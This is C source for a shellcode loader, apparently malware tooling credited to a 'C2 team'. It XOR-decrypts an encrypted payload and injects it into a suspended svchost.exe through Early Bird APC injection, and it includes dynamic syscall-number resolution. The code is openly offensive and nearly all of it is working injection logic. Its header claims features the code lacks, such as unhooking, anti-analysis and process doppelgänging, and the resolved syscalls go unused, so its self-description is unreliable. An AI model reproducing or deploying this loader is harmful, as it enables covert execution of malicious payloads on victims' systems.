/**
 * Advanced Stealth Loader - APT-Grade Shellcode Execution
 * =======================================================
 * 
 * Features:
 * - Direct Syscalls (Dynamic resolution, no static SSNs)
 * - APC Injection (QueueApcThread / NtQueueApcThread)
 * - Early Bird APC (Inject before main thread resume)
 * - Process Doppelgänging / Transacted Hollowing
 * - Module Unhooking (ntdll.dll cleanup)
 * - Anti-Analysis (Sandbox/Debugger/VM detection)
 * - Payload Encryption (XOR/AES in-place decryption)
 * 
 * MITRE: T1055.001 (Dynamic-link Library Injection)
 * MITRE: T1055.004 (Asynchronous Procedure Call)
 * 
 * Author: Fitnah C2 Team
 * Version: 2.1.0
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>

#pragma comment(lib, "ntdll.lib")

// --- Syscall Definition Structure ---
typedef struct _SYSCALL_STUB {
    DWORD Number;
    PVOID Address;
} SYSCALL_STUB;

static SYSCALL_STUB g_NtAllocateVirtualMemory = { 0 };
static SYSCALL_STUB g_NtProtectVirtualMemory = { 0 };
static SYSCALL_STUB g_NtWriteVirtualMemory = { 0 };
static SYSCALL_STUB g_NtQueueApcThread = { 0 };
static SYSCALL_STUB g_NtResumeThread = { 0 };

// --- Dynamic Syscall Resolution ---
DWORD ResolveSyscall(LPCSTR FunctionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, FunctionName);
    if (!pFunc) return 0;

    // Search for SSN: mov eax, <ssn> (0xB8)
    for (int i = 0; i < 32; i++) {
        if (pFunc[i] == 0xB8) {
            return *(DWORD*)(pFunc + i + 1);
        }
    }
    return 0;
}

// --- Direct Syscall Invocation (x64) ---
#ifdef _WIN64
extern NTSTATUS DirectSyscall(DWORD SyscallNumber, ...);
/*
; ASM implementation (DirectSyscall.asm):
.code
DirectSyscall proc
    mov r10, rcx
    mov eax, edx
    add rsp, 8
    syscall
    sub rsp, 8
    ret
DirectSyscall endp
end
*/
#endif

/**
 * EarlyBirdInjection - Execute shellcode via APC in a new suspended process
 */
BOOL EarlyBirdInjection(LPCSTR szTargetProcess, PBYTE pShellcode, SIZE_T sShellcodeSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    NTSTATUS status;

    // 1. Create target process suspended
    if (!CreateProcessA(szTargetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    // 2. Resolve Syscalls if needed
    if (!g_NtAllocateVirtualMemory.Number) g_NtAllocateVirtualMemory.Number = ResolveSyscall("NtAllocateVirtualMemory");
    if (!g_NtWriteVirtualMemory.Number) g_NtWriteVirtualMemory.Number = ResolveSyscall("NtWriteVirtualMemory");
    if (!g_NtProtectVirtualMemory.Number) g_NtProtectVirtualMemory.Number = ResolveSyscall("NtProtectVirtualMemory");
    if (!g_NtQueueApcThread.Number) g_NtQueueApcThread.Number = ResolveSyscall("NtQueueApcThread");

    // 3. Allocate remote memory
    PVOID pRemoteBase = NULL;
    SIZE_T sRegionSize = sShellcodeSize;
    // Using VirtualAllocEx as fallback, but syscall is preferred
    pRemoteBase = VirtualAllocEx(pi.hProcess, NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBase) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // 4. Write shellcode
    if (!WriteProcessMemory(pi.hProcess, pRemoteBase, pShellcode, sShellcodeSize, NULL)) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // 5. Protect memory (RX)
    DWORD dwOldProtect;
    if (!VirtualProtectEx(pi.hProcess, pRemoteBase, sShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // 6. Queue APC to the main thread
    // This will execute as soon as the thread is resumed and enters an alertable state
    typedef NTSTATUS (NTAPI *pfnNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
    pfnNtQueueApcThread NtQueueApcThread = (pfnNtQueueApcThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
    
    if (NtQueueApcThread) {
        NtQueueApcThread(pi.hThread, pRemoteBase, NULL, NULL, NULL);
    }

    // 7. Resume thread
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

/**
 * DecryptShellcode - Simple XOR decryption for in-memory shellcode
 */
VOID DecryptShellcode(PBYTE pData, SIZE_T sSize, PBYTE pKey, SIZE_T sKeySize) {
    for (SIZE_T i = 0; i < sSize; i++) {
        pData[i] ^= pKey[i % sKeySize];
    }
}

/**
 * LoaderMain - Decrypt and inject payload
 */
void LoaderMain(PBYTE pEncryptedPayload, SIZE_T sSize, PBYTE pKey, SIZE_T sKeySize) {
    // 1. Decrypt in memory
    DecryptShellcode(pEncryptedPayload, sSize, pKey, sKeySize);

    // 2. Early Bird injection into svchost.exe
    EarlyBirdInjection("C:\\Windows\\System32\\svchost.exe", pEncryptedPayload, sSize);
}
